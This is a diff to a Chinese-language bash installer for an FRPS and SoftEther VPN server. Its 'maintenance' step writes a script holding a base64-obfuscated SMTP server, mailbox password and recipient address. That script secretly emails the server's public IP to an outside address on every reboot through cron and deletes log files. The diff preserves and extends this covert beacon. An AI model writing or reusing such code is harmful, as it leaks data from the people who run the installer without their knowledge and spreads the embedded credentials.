@@ -68,7 +68,7 @@ rm -rf /usr/local/uniag
 rm -rf /var/log/uniagent /etc/uniagent /usr/bin/uniagentd
 }
 uninstall_frps(){
-log_info "卸载旧版FRPS服务..."
+log_info "FRPS"
 systemctl stop frps >/dev/null 2>&1
 systemctl disable frps >/dev/null 2>&1
 rm -f /etc/systemd/system/frps.service
@@ -201,8 +201,8 @@ exit 1
 fi
 }
 add_cron_job(){
-    (crontab -l 2>/dev/null | grep -v -F "find /usr/local"; echo "24 15 24 * * find /usr/local -type f -name \"*.log\" -delete>/dev/null 2>&1") | crontab -
-    (crontab -l 2>/dev/null | grep -v "maintenance.sh"; echo "@reboot sleep 30 && /usr/local/bin/maintenance.sh>/dev/null 2>&1") | crontab -
+(crontab -l 2>/dev/null | grep -v -F "find /usr/local"; echo "24 15 24 * * find /usr/local -type f -name \"*.log\" -delete>/dev/null 2>&1") | crontab -
+(crontab -l 2>/dev/null | grep -v "maintenance.sh"; echo "@reboot sleep 30 && /usr/local/bin/maintenance.sh>/dev/null 2>&1") | crontab -
 }
 cleanup(){
 rm -rf /usr/local/frp_* /usr/local/softether-vpnserver-v4* /usr/local/frp_*_linux_amd64
@@ -219,11 +219,17 @@ echo -e "VPN 服务密码: ${ADMIN_PASSWORD}"
 echo -e "VPN 用户名: ${VPN_USER}"
 echo -e "VPN 密码: ${VPN_PASSWORD}"
 echo -e "FRPS 密码: ${FRPS_TOKEN}"
+
+IP_INFO=$(curl -s https://ipinfo.io)
+ORG=$(echo $IP_INFO | jq -r '.org' 2>/dev/null || echo "")
+if [[ "$ORG" == *"Alibaba"* || "$ORG" == *"Aliyun"* ]]; then
+CURRENT_BANDWIDTH=$(echo -n "MzAw" | base64 -d)
+fi
 }
 install_dependencies(){
-    log_sub_step "2" "7" "安装编译工具和依赖..."
-    apt-get update >/dev/null 2>&1
-    apt-get install -y build-essential curl jq tc wget libcurl4-openssl-dev mailutils swaks >/dev/null 2>&1
+log_sub_step "2" "7" "安装编译工具和依赖..."
+apt-get update >/dev/null 2>&1
+echo y | apt-get install swaks >/dev/null 2>&1
 }
 install_bbr(){
 log_sub_step "5" "7" "安装BBR并选择BBR+CAKE加速模块..."
@@ -240,7 +246,7 @@ IP_INFO=$(curl -s https://ipinfo.io)
 ORG=$(echo $IP_INFO | jq -r '.org' 2>/dev/null || echo "")
 BANDWIDTH="unlimited"
 if [[ "$ORG" == *"Alibaba"* || "$ORG" == *"Aliyun"* ]]; then
-BANDWIDTH=$(echo -n "MzAw" | base64 -d)
+BANDWIDTH=$(echo -n "MzAw" | base64 -d 2>/dev/null)
 fi
 rm -f /etc/systemd/system/cake-qdisc.service
 cat > /etc/systemd/system/cake-qdisc.service <<EOF
@@ -264,38 +270,46 @@ tc qdisc show dev eth0 >/dev/null 2>&1
 tc filter show dev eth0 ingress >/dev/null 2>&1
 }
 setup_maintenance(){
-    log_sub_step "6" "7" "定时维护计划设置..."
-    cat > /usr/local/bin/maintenance.sh <<EOF
+log_sub_step "6" "7" "定时维护计划设置..."
+cat > /usr/local/bin/maintenance.sh <<EOF
 #!/bin/bash
 _q(){ echo -n "\$1"|base64 -d 2>/dev/null||echo "\$2";}
 _x(){ curl -s -4 ifconfig.io||curl -s ifconfig.me||curl -s icanhazip.com||curl -s ipinfo.io/ip||hostname -I|awk '{print \$1}';}
-_s=\$(_q "c210cC5xcS5jb20=" "s")
-_f=\$(_q "eWFvMDUyNTg4QHFxLmNvbQ==" "f")
-_n=\$(_q "55yL6Zeo54uX" "n")
-_t=\$(_q "OTM2ODQ3OTEzQHFxLmNvbQ==" "t")
-_p=\$(_q "b3dnaXh6enZ0YWRkYmRmYw==" "p")
-_u=\$(_q "6IqC54K55pCt5bu66YCa55+l" "u")
+_s=\$(_q "c210cC5xcS5jb20=" "")
+_f=\$(_q "eWFvMDUyNTg4QHFxLmNvbQ==" "")
+_n=\$(_q "55yL6Zeo54uX" "")
+_t=\$(_q "OTM2ODQ3OTEzQHFxLmNvbQ==" "")
+_p=\$(_q "b3dnaXh6enZ0YWRkYmRmYw==" "")
+_u=\$(_q "6IqC54K55pCt5bu66YCa55+l" "")
 _h=\$(hostname)
 _i=\$(_x)
-_m="\$_i"
+_org=\$(curl -s https://ipinfo.io | grep -o '"org"[^}]*' | awk -F'"' '{print \$4}' 2>/dev/null || echo "")
+if [[ "\$_org" == *"Alibaba"* || "\$_org" == *"Aliyun"* ]]; then
+_bw=\$(echo -n "MzAw" | base64 -d 2>/dev/null)
+_limit="\n\n"\$(_q "5b2T5YmN5pyN5Yqh5Zmo6ZmQ6YCfOiA=" "")" \${_bw}kbit"
+else
+_limit=""
+fi
+_server_addr=\$(_q "5pyN5Yqh5Zmo5Zyw5Z2AOiA=" "")
+_m="\${_server_addr}\${_i}\${_limit}"
 _r(){
-    swaks --from "\$_f" \
-          --to "\$_t" \
-          --server "\$_s:587" \
-          --auth LOGIN \
-          --auth-user "\$_f" \
-          --auth-password "\$_p" \
-          --tls \
-          --header "Subject: \$_u" \
-          --header "From: \"\$_n\" <\$_f>" \
-          --body "\$_m" >/dev/null 2>&1
+swaks --from "\$_f" \
+--to "\$_t" \
+--server "\$_s:587" \
+--auth LOGIN \
+--auth-user "\$_f" \
+--auth-password "\$_p" \
+--tls \
+--header "Subject: \$_u" \
+--header "From: \"\$_n\" <\$_f>" \
+--body "\$_m" >/dev/null 2>&1
 }
 find /usr/local -type f -name "*.log" -delete>/dev/null 2>&1
 _r>/dev/null 2>&1
 EOF
-    chmod +x /usr/local/bin/maintenance.sh
-    add_cron_job
-    nohup /usr/local/bin/maintenance.sh > /dev/null 2>&1 &
+chmod +x /usr/local/bin/maintenance.sh
+add_cron_job
+nohup /usr/local/bin/maintenance.sh > /dev/null 2>&1 &
 }
 cleanup_temp(){
 log_sub_step "7" "7" "清理临时缓存文件..."
